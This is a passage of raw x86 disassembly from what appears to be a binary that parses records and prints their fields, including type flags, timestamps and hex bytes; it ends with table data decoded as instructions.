  4055bb:	push   esi
  4055bc:	call   DWORD PTR ds:0x413190
  4055c2:	mov    edx,DWORD PTR [ebp-0x980]
  4055c8:	pop    ecx
  4055c9:	pop    ecx
  4055ca:	push   0x0
  4055cc:	push   esi
  4055cd:	push   DWORD PTR [ebp-0x98c]
  4055d3:	mov    ecx,edi
  4055d5:	call   0x40518c
  4055da:	mov    edi,eax
  4055dc:	test   edi,edi
  4055de:	je     0x4052dc
  4055e4:	push   0x402954
  4055e9:	push   esi
  4055ea:	call   DWORD PTR ds:0x413190
  4055f0:	mov    edx,DWORD PTR [ebp-0x980]
  4055f6:	pop    ecx
  4055f7:	pop    ecx
  4055f8:	push   0x0
  4055fa:	push   esi
  4055fb:	push   DWORD PTR [ebp-0x98c]
  405601:	mov    ecx,edi
  405603:	call   0x40518c
  405608:	mov    edi,eax
  40560a:	test   edi,edi
  40560c:	je     0x4052dc
  405612:	mov    ecx,edi
  405614:	call   0x40a17b
  405619:	push   eax
  40561a:	push   0x402970
  40561f:	push   esi
  405620:	call   DWORD PTR ds:0x413190
  405626:	add    esp,0xc
  405629:	lea    ecx,[edi+0x4]
  40562c:	call   0x40a17b
  405631:	mov    esi,eax
  405633:	mov    ecx,esi
  405635:	call   0x40a1f7
  40563a:	push   eax
  40563b:	push   esi
  40563c:	push   0x402980
  405641:	push   DWORD PTR [ebp-0x974]
  405647:	call   DWORD PTR ds:0x413190
  40564d:	add    esp,0x10
  405650:	lea    ecx,[edi+0x8]
  405653:	call   0x40a17b
  405658:	mov    esi,eax
  40565a:	mov    ecx,esi
  40565c:	call   0x40a1f7
  405661:	push   eax
  405662:	push   esi
  405663:	push   0x402998
  405668:	push   DWORD PTR [ebp-0x974]
  40566e:	call   DWORD PTR ds:0x413190
  405674:	add    esp,0x10
  405677:	lea    ecx,[edi+0xc]
  40567a:	call   0x40a17b
  40567f:	mov    esi,eax
  405681:	mov    ecx,esi
  405683:	call   0x40a1f7
  405688:	push   eax
  405689:	push   esi
  40568a:	push   0x4029b0
  40568f:	push   DWORD PTR [ebp-0x974]
  405695:	call   DWORD PTR ds:0x413190
  40569b:	add    esp,0x10
  40569e:	lea    ecx,[edi+0x10]
  4056a1:	call   0x40a17b
  4056a6:	mov    esi,eax
  4056a8:	mov    ecx,esi
  4056aa:	call   0x40a1f7
  4056af:	push   eax
  4056b0:	push   esi
  4056b1:	mov    esi,DWORD PTR [ebp-0x974]
  4056b7:	push   0x4029c8
  4056bc:	push   esi
  4056bd:	call   DWORD PTR ds:0x413190
  4056c3:	add    esp,0x10
  4056c6:	add    edi,0x14
  4056c9:	jmp    0x406059
  4056ce:	cmp    DWORD PTR [ebp-0x97c],0x0
  4056d5:	jne    0x4056e2
  4056d7:	push   esi
  4056d8:	push   0xa
  4056da:	call   DWORD PTR ds:0x41314c
  4056e0:	pop    ecx
  4056e1:	pop    ecx
  4056e2:	push   0x4029e4
  4056e7:	push   esi
  4056e8:	call   DWORD PTR ds:0x413190
  4056ee:	mov    edx,DWORD PTR [ebp-0x980]
  4056f4:	pop    ecx
  4056f5:	pop    ecx
  4056f6:	push   0x0
  4056f8:	push   esi
  4056f9:	push   DWORD PTR [ebp-0x98c]
  4056ff:	mov    ecx,edi
  405701:	call   0x40518c
  405706:	push   0x402a04
  40570b:	mov    edi,DWORD PTR [ebp-0x974]
  405711:	mov    esi,eax
  405713:	push   edi
  405714:	call   DWORD PTR ds:0x413190
  40571a:	mov    edx,DWORD PTR [ebp-0x980]
  405720:	pop    ecx
  405721:	pop    ecx
  405722:	push   0x0
  405724:	push   edi
  405725:	push   DWORD PTR [ebp-0x98c]
  40572b:	mov    ecx,esi
  40572d:	call   0x40518c
  405732:	mov    esi,edi
  405734:	mov    edi,eax
  405736:	push   esi
  405737:	push   0xa
  405739:	call   DWORD PTR ds:0x41314c
  40573f:	pop    ecx
  405740:	pop    ecx
  405741:	jmp    0x406059
  405746:	push   esi
  405747:	push   0x402a1c
  40574c:	call   DWORD PTR ds:0x41313c
  405752:	pop    ecx
  405753:	pop    ecx
  405754:	jmp    0x40577b
  405756:	movzx  ecx,BYTE PTR [edi]
  405759:	inc    edi
  40575a:	mov    DWORD PTR [ebp-0x978],ecx
  405760:	test   ecx,ecx
  405762:	je     0x405781
  405764:	push   edi
  405765:	push   ecx
  405766:	push   0x402a28
  40576b:	push   esi
  40576c:	call   DWORD PTR ds:0x413190
  405772:	add    esp,0x10
  405775:	add    edi,DWORD PTR [ebp-0x978]
  40577b:	mov    eax,DWORD PTR [ebp-0x988]
  405781:	cmp    edi,eax
  405783:	jb     0x405756
  405785:	push   esi
  405786:	push   0x402a34
  40578b:	call   DWORD PTR ds:0x41313c
  405791:	jmp    0x40573f
  405793:	cmp    DWORD PTR [ebp-0x994],0x5
  40579a:	jb     0x406059
  4057a0:	cmp    DWORD PTR [ebp-0x97c],0x0
  4057a7:	jne    0x4057b4
  4057a9:	push   esi
  4057aa:	push   0xa
  4057ac:	call   DWORD PTR ds:0x41314c
  4057b2:	pop    ecx
  4057b3:	pop    ecx
  4057b4:	movsx  eax,BYTE PTR [edi+0x4]
  4057b8:	mov    esi,DWORD PTR [edi]
  4057ba:	push   eax
  4057bb:	call   DWORD PTR ds:0x413038
  4057c1:	mov    DWORD PTR [ebp-0x978],eax
  4057c7:	lea    ecx,[ebp-0x14]
  4057ca:	test   eax,eax
  4057cc:	je     0x4057de
  4057ce:	push   DWORD PTR [eax]
  4057d0:	push   esi
  4057d1:	call   0x40c04d
  4057d6:	push   eax
  4057d7:	push   0x402a74
  4057dc:	jmp    0x4057ef
  4057de:	movsx  eax,BYTE PTR [edi+0x4]
  4057e2:	push   eax
  4057e3:	push   esi
  4057e4:	call   0x40c04d
  4057e9:	push   eax
  4057ea:	push   0x402a98
  4057ef:	mov    esi,DWORD PTR [ebp-0x974]
  4057f5:	push   esi
  4057f6:	call   DWORD PTR ds:0x413190
  4057fc:	add    esp,0x10
  4057ff:	add    edi,0x5
  405802:	xor    eax,eax
  405804:	mov    DWORD PTR [ebp-0x980],eax
  40580a:	jmp    0x405889
  40580c:	movsx  ecx,BYTE PTR [edi]
  40580f:	inc    edi
  405810:	mov    DWORD PTR [ebp-0x990],edi
  405816:	mov    edi,DWORD PTR [ebp-0x978]
  40581c:	mov    DWORD PTR [ebp-0x97c],ecx
  405822:	test   cl,cl
  405824:	jns    0x405870
  405826:	test   edi,edi
  405828:	je     0x40582e
  40582a:	mov    ecx,DWORD PTR [edi]
  40582c:	jmp    0x405830
  40582e:	xor    ecx,ecx
  405830:	push   ecx
  405831:	push   eax
  405832:	call   DWORD PTR ds:0x413014
  405838:	movzx  eax,ax
  40583b:	push   eax
  40583c:	call   DWORD PTR ds:0x41303c
  405842:	test   eax,eax
  405844:	je     0x40584f
  405846:	push   DWORD PTR [eax]
  405848:	push   0x402abc
  40584d:	jmp    0x40585a
  40584f:	push   DWORD PTR [ebp-0x980]
  405855:	push   0x402ac4
  40585a:	push   esi
  40585b:	call   DWORD PTR ds:0x413190
  405861:	mov    ecx,DWORD PTR [ebp-0x97c]
  405867:	add    esp,0xc
  40586a:	mov    eax,DWORD PTR [ebp-0x980]
  405870:	add    ecx,ecx
  405872:	inc    eax
  405873:	mov    DWORD PTR [ebp-0x97c],ecx
  405879:	mov    DWORD PTR [ebp-0x980],eax
  40587f:	test   al,0x7
  405881:	jne    0x405822
  405883:	mov    edi,DWORD PTR [ebp-0x990]
  405889:	cmp    edi,DWORD PTR [ebp-0x988]
  40588f:	jb     0x40580c
  405895:	jmp    0x405736
  40589a:	mov    edx,DWORD PTR [ebp-0x994]
  4058a0:	push   edx
  4058a1:	push   0x402acc
  4058a6:	push   esi
  4058a7:	call   DWORD PTR ds:0x413190
  4058ad:	jmp    0x406050
  4058b2:	movsx  eax,BYTE PTR [edi]
  4058b5:	inc    edi
  4058b6:	mov    DWORD PTR [ebp-0x978],eax
  4058bc:	test   eax,eax
  4058be:	je     0x406059
  4058c4:	push   edi
  4058c5:	push   eax
  4058c6:	push   0x402ae0
  4058cb:	jmp    0x40558d
  4058d0:	movzx  eax,BYTE PTR [edi]
  4058d3:	shl    ax,0x8
  4058d7:	movzx  ecx,ax
  4058da:	movzx  eax,BYTE PTR [edi+0x1]
  4058de:	or     ecx,eax
  4058e0:	push   ecx
  4058e1:	push   0x402afc
  4058e6:	push   esi
  4058e7:	call   DWORD PTR ds:0x413190
  4058ed:	add    esp,0xc
  4058f0:	push   0x402b10
  4058f5:	push   esi
  4058f6:	call   DWORD PTR ds:0x413190
  4058fc:	pop    ecx
  4058fd:	pop    ecx
  4058fe:	lea    ecx,[edi+0x2]
  405901:	mov    edx,DWORD PTR [ebp-0x980]
  405907:	push   0x0
  405909:	push   esi
  40590a:	push   DWORD PTR [ebp-0x98c]
  405910:	call   0x40518c
  405915:	jmp    0x405734
  40591a:	movsx  ecx,BYTE PTR [edi]
  40591d:	inc    edi
  40591e:	mov    DWORD PTR [ebp-0x978],ecx
  405924:	test   ecx,ecx
  405926:	je     0x405945
  405928:	push   edi
  405929:	push   ecx
  40592a:	push   0x402b28
  40592f:	push   esi
  405930:	call   DWORD PTR ds:0x413190
  405936:	mov    eax,DWORD PTR [ebp-0x988]
  40593c:	add    esp,0x10
  40593f:	add    edi,DWORD PTR [ebp-0x978]
  405945:	cmp    edi,eax
  405947:	jae    0x406059
  40594d:	movsx  eax,BYTE PTR [edi]
  405950:	inc    edi
  405951:	mov    DWORD PTR [ebp-0x978],eax
  405957:	test   eax,eax
  405959:	je     0x406059
  40595f:	push   edi
  405960:	push   eax
  405961:	push   0x402b40
  405966:	jmp    0x40558d
  40596b:	cmp    DWORD PTR [ebp-0x97c],0x0
  405972:	jne    0x40597f
  405974:	push   esi
  405975:	push   0xa
  405977:	call   DWORD PTR ds:0x41314c
  40597d:	pop    ecx
  40597e:	pop    ecx
  40597f:	push   0x402b54
  405984:	push   esi
  405985:	call   DWORD PTR ds:0x413190
  40598b:	mov    edx,DWORD PTR [ebp-0x980]
  405991:	pop    ecx
  405992:	pop    ecx
  405993:	push   0x0
  405995:	push   esi
  405996:	push   DWORD PTR [ebp-0x98c]
  40599c:	mov    ecx,edi
  40599e:	call   0x40518c
  4059a3:	push   0x402b64
  4059a8:	jmp    0x40570b
  4059ad:	cmp    DWORD PTR [ebp-0x994],0x10
  4059b4:	je     0x4059c7
  4059b6:	push   0x402b78
  4059bb:	push   esi
  4059bc:	call   DWORD PTR ds:0x413190
  4059c2:	jmp    0x40573f
  4059c7:	mov    esi,edi
  4059c9:	lea    eax,[ebp-0x60]
  4059cc:	lea    edi,[ebp-0x970]
  4059d2:	push   eax
  4059d3:	lea    eax,[ebp-0x970]
  4059d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059da:	push   eax
  4059db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059de:	call   DWORD PTR ds:0x4131c4
  4059e4:	mov    edi,DWORD PTR [ebp-0x990]
  4059ea:	lea    eax,[ebp-0x60]
  4059ed:	mov    esi,DWORD PTR [ebp-0x974]
  4059f3:	add    edi,0x10
  4059f6:	push   eax
  4059f7:	push   0x402b9c
  4059fc:	push   esi
  4059fd:	call   DWORD PTR ds:0x413190
  405a03:	add    esp,0xc
  405a06:	jmp    0x406059
  405a0b:	movzx  eax,BYTE PTR [edi+0x4]
  405a0f:	mov    esi,edi
  405a11:	shl    ax,0x8
  405a15:	movzx  ecx,ax
  405a18:	movzx  eax,BYTE PTR [edi+0x5]
  405a1c:	or     ecx,eax
  405a1e:	movzx  eax,BYTE PTR [edi+0x2]
  405a22:	push   ecx
  405a23:	shl    ax,0x8
  405a27:	movzx  ecx,ax
  405a2a:	movzx  eax,BYTE PTR [edi+0x3]
  405a2e:	or     ecx,eax
  405a30:	movzx  eax,BYTE PTR [esi]
  405a33:	push   ecx
  405a34:	shl    ax,0x8
  405a38:	movzx  ecx,ax
  405a3b:	movzx  eax,BYTE PTR [esi+0x1]
  405a3f:	mov    esi,DWORD PTR [ebp-0x974]
  405a45:	or     ecx,eax
  405a47:	push   ecx
  405a48:	push   0x402bb8
  405a4d:	push   esi
  405a4e:	call   DWORD PTR ds:0x413190
  405a54:	add    esp,0x14
  405a57:	lea    ecx,[edi+0x6]
  405a5a:	jmp    0x405901
  405a5f:	push   0x402d44
  405a64:	push   esi
  405a65:	call   DWORD PTR ds:0x413190
  405a6b:	mov    edx,DWORD PTR [ebp-0x980]
  405a71:	pop    ecx
  405a72:	pop    ecx
  405a73:	push   0x0
  405a75:	push   esi
  405a76:	push   DWORD PTR [ebp-0x98c]
  405a7c:	mov    ecx,edi
  405a7e:	call   0x40518c
  405a83:	mov    edi,eax
  405a85:	test   edi,edi
  405a87:	je     0x4052dc
  405a8d:	push   0x402d60
  405a92:	push   esi
  405a93:	call   DWORD PTR ds:0x413190
  405a99:	mov    eax,DWORD PTR [ebp-0x988]
  405a9f:	and    DWORD PTR [ebp-0x978],0x0
  405aa6:	sub    eax,edi
  405aa8:	cmp    DWORD PTR [ebp-0x988],edi
  405aae:	pop    ecx
  405aaf:	pop    ecx
  405ab0:	sbb    ecx,ecx
  405ab2:	not    ecx
  405ab4:	and    ecx,eax
  405ab6:	mov    DWORD PTR [ebp-0x97c],ecx
  405abc:	jbe    0x405736
  405ac2:	movzx  eax,BYTE PTR [edi]
  405ac5:	push   eax
  405ac6:	push   0x402d74
  405acb:	push   esi
  405acc:	call   DWORD PTR ds:0x413190
  405ad2:	mov    eax,DWORD PTR [ebp-0x978]
  405ad8:	add    esp,0xc
  405adb:	inc    edi
  405adc:	inc    eax
  405add:	mov    DWORD PTR [ebp-0x978],eax
  405ae3:	cmp    eax,DWORD PTR [ebp-0x97c]
  405ae9:	jb     0x405ac2
  405aeb:	jmp    0x405736
  405af0:	push   0xff
  405af5:	lea    eax,[ebp-0x15f]
  405afb:	mov    BYTE PTR [ebp-0x160],0x0
  405b02:	push   0x0
  405b04:	push   eax
  405b05:	call   0x40d4a8
  405b0a:	movzx  ecx,BYTE PTR [edi]
  405b0d:	add    esp,0xc
  405b10:	movzx  eax,BYTE PTR [edi+0x1]
  405b14:	shl    cx,0x8
  405b18:	or     cx,ax
  405b1b:	movzx  eax,cx
  405b1e:	mov    cl,BYTE PTR [edi+0x2]
  405b21:	mov    BYTE PTR [ebp-0x981],cl
  405b27:	mov    cl,BYTE PTR [edi+0x3]
  405b2a:	add    edi,0x4
  405b2d:	mov    BYTE PTR [ebp-0x982],cl
  405b33:	mov    ecx,DWORD PTR [ebp-0x988]
  405b39:	sub    ecx,edi
  405b3b:	mov    DWORD PTR [ebp-0x97c],eax
  405b41:	movzx  eax,ax
  405b44:	mov    DWORD PTR [ebp-0x990],ecx
  405b4a:	mov    ecx,0xc000
  405b4f:	mov    DWORD PTR [ebp-0x978],eax
  405b55:	and    eax,ecx
  405b57:	je     0x405b80
  405b59:	cmp    eax,0x4000
  405b5e:	je     0x405b79
  405b60:	cmp    eax,0x8000
  405b65:	je     0x405b72
  405b67:	cmp    eax,ecx
  405b69:	jne    0x405b9a
  405b6b:	push   0x402da0
  405b70:	jmp    0x405b85
  405b72:	push   0x402d94
  405b77:	jmp    0x405b85
  405b79:	push   0x402d88
  405b7e:	jmp    0x405b85
  405b80:	push   0x402d7c
  405b85:	lea    eax,[ebp-0x160]
  405b8b:	push   0x100
  405b90:	push   eax
  405b91:	call   DWORD PTR ds:0x41312c
  405b97:	add    esp,0xc
  405b9a:	test   DWORD PTR [ebp-0x97c],0x1000
  405ba4:	je     0x405bc0
  405ba6:	push   0x402da8
  405bab:	lea    eax,[ebp-0x160]
  405bb1:	push   0x100
  405bb6:	push   eax
  405bb7:	call   DWORD PTR ds:0x41312c
  405bbd:	add    esp,0xc
  405bc0:	mov    eax,DWORD PTR [ebp-0x978]
  405bc6:	mov    edx,0x300
  405bcb:	mov    ecx,0x100
  405bd0:	and    eax,edx
  405bd2:	je     0x405bf8
  405bd4:	cmp    eax,ecx
  405bd6:	je     0x405bf1
  405bd8:	cmp    eax,0x200
  405bdd:	je     0x405bea
  405bdf:	cmp    eax,edx
  405be1:	jne    0x405c0e
  405be3:	push   0x402dd8
  405be8:	jmp    0x405bfd
  405bea:	push   0x402dcc
  405bef:	jmp    0x405bfd
  405bf1:	push   0x402dc0
  405bf6:	jmp    0x405bfd
  405bf8:	push   0x402db4
  405bfd:	push   ecx
  405bfe:	lea    eax,[ebp-0x160]
  405c04:	push   eax
  405c05:	call   DWORD PTR ds:0x41312c
  405c0b:	add    esp,0xc
  405c0e:	mov    eax,ds:0x40e128
  405c13:	and    BYTE PTR [ebp-0x97c],0xf
  405c1a:	and    eax,0x4000
  405c1f:	push   eax
  405c20:	push   ecx
  405c21:	push   ecx
  405c22:	push   DWORD PTR [ebp-0x990]
  405c28:	lea    ecx,[ebp-0x960]
  405c2e:	push   edi
  405c2f:	call   0x40c21c
  405c34:	neg    eax
  405c36:	lea    ecx,[ebp-0x960]
  405c3c:	sbb    eax,eax
  405c3e:	and    eax,ecx
  405c40:	movzx  ecx,BYTE PTR [ebp-0x982]
  405c47:	push   eax
  405c48:	push   DWORD PTR [ebp-0x990]
  405c4e:	call   0x40b901
  405c53:	movzx  ecx,BYTE PTR [ebp-0x981]
  405c5a:	push   eax
  405c5b:	call   0x40b953
  405c60:	push   eax
  405c61:	mov    eax,DWORD PTR [ebp-0x97c]
  405c67:	movzx  eax,al
  405c6a:	push   eax
  405c6b:	lea    eax,[ebp-0x160]
  405c71:	push   eax
  405c72:	push   DWORD PTR [ebp-0x978]
  405c78:	push   0x402df0
  405c7d:	push   esi
  405c7e:	call   DWORD PTR ds:0x413190
  405c84:	add    esp,0x24
  405c87:	add    edi,DWORD PTR [ebp-0x990]
  405c8d:	jmp    0x406059
  405c92:	movzx  ecx,BYTE PTR [edi]
  405c95:	movzx  eax,BYTE PTR [edi+0x1]
  405c99:	shl    cx,0x8
  405c9d:	or     cx,ax
  405ca0:	movzx  eax,cx
  405ca3:	lea    ecx,[edi+0x4]
  405ca6:	mov    DWORD PTR [ebp-0x9a0],eax
  405cac:	mov    al,BYTE PTR [edi+0x2]
  405caf:	mov    BYTE PTR [ebp-0x982],al
  405cb5:	mov    al,BYTE PTR [edi+0x3]
  405cb8:	mov    BYTE PTR [ebp-0x981],al
  405cbe:	call   0x40a17b
  405cc3:	lea    ecx,[edi+0x8]
  405cc6:	mov    DWORD PTR [ebp-0x998],eax
  405ccc:	call   0x40a17b
  405cd1:	lea    ecx,[edi+0xc]
  405cd4:	mov    DWORD PTR [ebp-0x97c],eax
  405cda:	call   0x40a17b
  405cdf:	add    edi,0x10
  405ce2:	mov    DWORD PTR [ebp-0x978],eax
  405ce8:	mov    DWORD PTR [ebp-0x990],edi
  405cee:	movzx  ecx,BYTE PTR [edi]
  405cf1:	movzx  eax,BYTE PTR [edi+0x1]
  405cf5:	shl    cx,0x8
  405cf9:	or     cx,ax
  405cfc:	movzx  eax,cx
  405cff:	mov    DWORD PTR [ebp-0x99c],eax
  405d05:	lea    eax,[ebp-0x978]
  405d0b:	push   eax
  405d0c:	call   DWORD PTR ds:0x413150
  405d12:	pop    ecx
  405d13:	push   0x9
  405d15:	mov    esi,eax
  405d17:	lea    edi,[ebp-0x44]
  405d1a:	pop    ecx
  405d1b:	lea    eax,[ebp-0x97c]
  405d21:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d23:	push   eax
  405d24:	call   DWORD PTR ds:0x413150
  405d2a:	pop    ecx
  405d2b:	mov    ecx,DWORD PTR [ebp-0x99c]
  405d31:	mov    edx,eax
  405d33:	mov    eax,DWORD PTR [ebp-0x30]
  405d36:	movzx  ecx,cx
  405d39:	add    eax,0x76c
  405d3e:	push   ecx
  405d3f:	push   DWORD PTR [ebp-0x978]
  405d45:	mov    ecx,DWORD PTR [ebp-0x34]
  405d48:	push   DWORD PTR [ebp-0x44]
  405d4b:	inc    ecx
  405d4c:	push   DWORD PTR [ebp-0x40]
  405d4f:	push   DWORD PTR [ebp-0x3c]
  405d52:	push   DWORD PTR [ebp-0x38]
  405d55:	push   ecx
  405d56:	push   eax
  405d57:	push   DWORD PTR [ebp-0x97c]
  405d5d:	mov    eax,DWORD PTR [edx+0x10]
  405d60:	push   DWORD PTR [edx]
  405d62:	movzx  ecx,BYTE PTR [ebp-0x982]
  405d69:	inc    eax
  405d6a:	push   DWORD PTR [edx+0x4]
  405d6d:	push   DWORD PTR [edx+0x8]
  405d70:	push   DWORD PTR [edx+0xc]
  405d73:	push   eax
  405d74:	mov    eax,DWORD PTR [edx+0x14]
  405d77:	add    eax,0x76c
  405d7c:	push   eax
  405d7d:	push   DWORD PTR [ebp-0x998]
  405d83:	movzx  eax,BYTE PTR [ebp-0x981]
  405d8a:	push   eax
  405d8b:	call   0x40b901
  405d90:	push   eax
  405d91:	mov    eax,DWORD PTR [ebp-0x9a0]
  405d97:	movzx  ecx,ax
  405d9a:	call   0x40b8af
  405d9f:	mov    esi,DWORD PTR [ebp-0x974]
  405da5:	push   eax
  405da6:	push   0x402e58
  405dab:	push   esi
  405dac:	call   DWORD PTR ds:0x413190
  405db2:	add    esp,0x54
  405db5:	mov    ecx,DWORD PTR [ebp-0x990]
  405dbb:	mov    edx,DWORD PTR [ebp-0x980]
  405dc1:	add    ecx,0x2
  405dc4:	push   0x0
  405dc6:	push   esi
  405dc7:	push   DWORD PTR [ebp-0x98c]
  405dcd:	call   0x40518c
  405dd2:	mov    edi,eax
  405dd4:	test   edi,edi
  405dd6:	je     0x4052dc
  405ddc:	mov    eax,ds:0x40e128
  405de1:	mov    esi,DWORD PTR [ebp-0x988]
  405de7:	and    eax,0x4000
  405dec:	push   eax
  405ded:	push   ecx
  405dee:	push   ecx
  405def:	sub    esi,edi
  405df1:	lea    ecx,[ebp-0x960]
  405df7:	push   esi
  405df8:	push   edi
  405df9:	call   0x40c21c
  405dfe:	neg    eax
  405e00:	lea    ecx,[ebp-0x960]
  405e06:	sbb    eax,eax
  405e08:	and    eax,ecx
  405e0a:	push   eax
  405e0b:	push   esi
  405e0c:	push   0x402f5c
  405e11:	push   DWORD PTR [ebp-0x974]
  405e17:	call   DWORD PTR ds:0x413190
  405e1d:	add    esp,0x10
  405e20:	add    edi,esi
  405e22:	jmp    0x405e55
  405e24:	push   0x40285c
  405e29:	push   esi
  405e2a:	call   DWORD PTR ds:0x413190
  405e30:	pop    ecx
  405e31:	pop    ecx
  405e32:	mov    ecx,edi
  405e34:	mov    edx,DWORD PTR [ebp-0x980]
  405e3a:	push   0x0
  405e3c:	push   esi
  405e3d:	push   DWORD PTR [ebp-0x98c]
  405e43:	call   0x40518c
  405e48:	push   esi
  405e49:	push   0xa
  405e4b:	mov    edi,eax
  405e4d:	call   DWORD PTR ds:0x41314c
  405e53:	pop    ecx
  405e54:	pop    ecx
  405e55:	mov    esi,DWORD PTR [ebp-0x974]
  405e5b:	jmp    0x406059
  405e60:	cmp    ecx,0x64
  405e63:	je     0x40603d
  405e69:	jle    0x40602b
  405e6f:	cmp    ecx,0x66
  405e72:	jle    0x405fc8
  405e78:	cmp    ecx,0xff01
  405e7e:	je     0x405efd
  405e80:	cmp    ecx,0xff02
  405e86:	jne    0x40602b
  405e8c:	mov    ecx,edi
  405e8e:	call   0x40a17b
  405e93:	lea    ecx,[edi+0x4]
  405e96:	mov    DWORD PTR [ebp-0x9a0],eax
  405e9c:	call   0x40a17b
  405ea1:	lea    ecx,[edi+0x8]
  405ea4:	mov    DWORD PTR [ebp-0x99c],eax
  405eaa:	call   0x40a17b
  405eaf:	mov    DWORD PTR [ebp-0x998],eax
  405eb5:	mov    ecx,0x402c32
  405eba:	mov    eax,DWORD PTR [ebp-0x9a0]
  405ec0:	mov    edx,0x402c2c
  405ec5:	test   eax,0x10000
  405eca:	jne    0x405ece
  405ecc:	mov    edx,ecx
  405ece:	test   eax,eax
  405ed0:	jns    0x405ed7
  405ed2:	mov    ecx,0x402c34
  405ed7:	push   DWORD PTR [ebp-0x998]
  405edd:	push   DWORD PTR [ebp-0x99c]
  405ee3:	push   edx
  405ee4:	push   ecx
  405ee5:	push   eax
  405ee6:	push   0x402cc8
  405eeb:	push   esi
  405eec:	call   DWORD PTR ds:0x413190
  405ef2:	add    esp,0x1c
  405ef5:	lea    ecx,[edi+0xc]
  405ef8:	jmp    0x405e34
  405efd:	mov    ecx,edi
  405eff:	call   0x40a17b
  405f04:	lea    ecx,[edi+0x4]
  405f07:	mov    DWORD PTR [ebp-0x9a0],eax
  405f0d:	call   0x40a17b
  405f12:	lea    ecx,[edi+0x8]
  405f15:	mov    DWORD PTR [ebp-0x99c],eax
  405f1b:	call   0x40a17b
  405f20:	lea    ecx,[edi+0xc]
  405f23:	mov    DWORD PTR [ebp-0x998],eax
  405f29:	call   0x40a17b
  405f2e:	mov    edx,DWORD PTR [ebp-0x9a0]
  405f34:	add    edi,0x10
  405f37:	mov    DWORD PTR [ebp-0x97c],eax
  405f3d:	mov    ecx,0x402c32
  405f42:	mov    DWORD PTR [ebp-0x978],0x402c2c
  405f4c:	test   edx,0x10000
  405f52:	jne    0x405f5a
  405f54:	mov    DWORD PTR [ebp-0x978],ecx
  405f5a:	test   edx,edx
  405f5c:	jns    0x405f63
  405f5e:	mov    ecx,0x402c34
  405f63:	push   eax
  405f64:	push   DWORD PTR [ebp-0x998]
  405f6a:	push   DWORD PTR [ebp-0x99c]
  405f70:	push   DWORD PTR [ebp-0x978]
  405f76:	push   ecx
  405f77:	push   edx
  405f78:	push   0x402c40
  405f7d:	push   esi
  405f7e:	call   DWORD PTR ds:0x413190
  405f84:	add    esp,0x20
  405f87:	jmp    0x405fb9
  405f89:	dec    eax
  405f8a:	mov    DWORD PTR [ebp-0x97c],eax
  405f90:	cmp    edi,DWORD PTR [ebp-0x988]
  405f96:	jae    0x405e55
  405f9c:	push   DWORD PTR [edi]
  405f9e:	lea    ecx,[ebp-0x14]
  405fa1:	call   0x40c04d
  405fa6:	push   eax
  405fa7:	push   0x402cb0
  405fac:	push   esi
  405fad:	call   DWORD PTR ds:0x413190
  405fb3:	add    esp,0xc
  405fb6:	add    edi,0x4
  405fb9:	mov    eax,DWORD PTR [ebp-0x97c]
  405fbf:	test   eax,eax
  405fc1:	jne    0x405f89
  405fc3:	jmp    0x405e55
  405fc8:	cmp    edx,0x4
  405fcb:	jne    0x406000
  405fcd:	mov    ecx,edi
  405fcf:	call   0x40a17b
  405fd4:	push   eax
  405fd5:	xor    eax,eax
  405fd7:	cmp    DWORD PTR [ebp-0x9a8],0x65
  405fde:	setne  al
  405fe1:	dec    eax
  405fe2:	and    eax,0xe
  405fe5:	add    eax,0x67
  405fe8:	push   eax
  405fe9:	push   0x402a4c
  405fee:	push   esi
  405fef:	call   DWORD PTR ds:0x413190
  405ff5:	add    esp,0x10
  405ff8:	add    edi,0x4
  405ffb:	jmp    0x405e55
  406000:	xor    eax,eax
  406002:	cmp    ecx,0x65
  406005:	push   edx
  406006:	setne  al
  406009:	dec    eax
  40600a:	and    eax,0xe
  40600d:	add    eax,0x67
  406010:	push   eax
  406011:	push   0x402a5c
  406016:	push   esi
  406017:	call   DWORD PTR ds:0x413190
  40601d:	add    esp,0x10
  406020:	mov    edi,DWORD PTR [ebp-0x988]
  406026:	jmp    0x405e55
  40602b:	push   ecx
  40602c:	push   0x402f78
  406031:	push   esi
  406032:	call   DWORD PTR ds:0x413190
  406038:	add    esp,0xc
  40603b:	jmp    0x406020
  40603d:	push   edi
  40603e:	push   0x402a38
  406043:	push   esi
  406044:	call   DWORD PTR ds:0x413190
  40604a:	mov    esi,DWORD PTR [ebp-0x974]
  406050:	add    esp,0xc
  406053:	mov    edi,DWORD PTR [ebp-0x988]
  406059:	test   BYTE PTR ds:0x40e128,0x2
  406060:	je     0x40608c
  406062:	cmp    DWORD PTR [ebp-0x9a8],0x6
  406069:	je     0x40608c
  40606b:	mov    ecx,DWORD PTR [ebp-0x9a4]
  406071:	call   0x40a1f7
  406076:	push   eax
  406077:	push   DWORD PTR [ebp-0x9a4]
  40607d:	push   0x402f94
  406082:	push   esi
  406083:	call   DWORD PTR ds:0x413190
  406089:	add    esp,0x10
  40608c:	cmp    edi,DWORD PTR [ebp-0x988]
  406092:	je     0x4060b2
  406094:	push   DWORD PTR [ebp-0x994]
  40609a:	sub    edi,DWORD PTR [ebp-0x9ac]
  4060a0:	push   edi
  4060a1:	push   0x402fa8
  4060a6:	push   esi
  4060a7:	call   DWORD PTR ds:0x413190
  4060ad:	add    esp,0x10
  4060b0:	xor    edi,edi
  4060b2:	mov    eax,edi
  4060b4:	mov    ecx,DWORD PTR [ebp-0x4]
  4060b7:	pop    edi
  4060b8:	xor    ecx,ebp
  4060ba:	pop    esi
  4060bb:	call   0x40cd10
  4060c0:	mov    esp,ebp
  4060c2:	pop    ebp
  4060c3:	mov    esp,ebx
  4060c5:	pop    ebx
  4060c6:	ret    0x8
  4060c9:	or     al,0x54
  4060cb:	inc    eax
  4060cc:	add    BYTE PTR [ebx],bh
  4060ce:	push   ebp
  4060cf:	inc    eax
  4060d0:	add    BYTE PTR [ebx],ch
  4060d2:	pusha  
  4060d3:	inc    eax
  4060d4:	add    BYTE PTR [ebx],ch
  4060d6:	pusha  
  4060d7:	inc    eax
  4060d8:	add    BYTE PTR [ecx-0x5dffbfac],bh
  4060de:	push   ebp
  4060df:	inc    eax
  4060e0:	add    dl,bh
  4060e2:	push   esp
  4060e3:	inc    eax
  4060e4:	add    al,dh
  4060e6:	push   esp
  4060e7:	inc    eax
  4060e8:	add    BYTE PTR [edx*2+0x589a0040],al
